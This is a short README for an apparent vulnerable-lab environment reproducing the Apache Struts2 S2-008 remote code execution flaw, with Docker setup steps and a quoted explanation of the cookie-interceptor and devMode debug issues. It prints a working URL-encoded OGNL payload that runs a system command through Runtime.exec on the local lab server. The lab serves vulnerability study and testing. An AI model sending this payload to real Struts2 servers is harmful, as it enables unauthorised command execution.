# S2-008 Remote Code Execution Vulnerablity

[中文版本(Chinese version)](README.zh-cn.md)

Affected Version: 2.1.0 - 2.3.1

Details: http://struts.apache.org/docs/s2-008.html

## Setup

```
docker-compose build
docker-compose up -d
```

## Reference

http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html

> S2-008 involves multiple vulnerabilities. Cookie interceptor configuration problem can cause OGNL expressions execute, but most web containers (such as Tomcat) have character restrictions for cookie names, some key characters cannot be used. Another point is that if the struts2 turn on `devMode` mode, there are multiple debug interfaces that can directly view object information or execute commands. As Kxlzx(author) mentions, this situation is almost impossible in the real environment. So it becomes It's very useless, but I don't think it's absolute. It's possible to hack a struts2 application that turn on `debug` mode on the server as a backdoor.

For example, adding the parameter `?debug=command&expression=<OGNL EXP>` in `devMode` mode, OGNL expression will be executed directly and you can execute the command:

```
http://localhost:8080/S2-008/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)
```
